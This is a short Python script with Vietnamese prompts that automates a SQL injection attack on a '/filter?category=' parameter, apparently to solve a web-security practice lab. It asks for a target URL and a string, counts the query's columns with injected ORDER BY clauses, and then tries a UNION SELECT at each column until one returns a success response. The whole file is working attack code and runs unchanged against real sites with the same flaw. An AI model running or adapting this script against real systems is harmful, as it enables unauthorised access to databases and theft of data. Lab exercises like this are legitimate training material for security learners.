import requests
 
url = input("Nhập URL:").rstrip("/")
target_str = input("Nhập chuỗi muốn truy xuất:")

i=1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if(response.status_code == 200):
        i+=1
    else:
        i-=1
        break

for pos in range(i):
    tmp = ["NULL"]*i
    tmp[pos] = f"'{target_str}'"

    null_tmp = ",+".join(tmp)
    target_url = f"{url}/filter?category=Gifts'UNION+SELECT+{null_tmp}--"
    response = requests.get(target_url)
    

    if response.status_code == 200:
        print("Solved the Lab")
        break
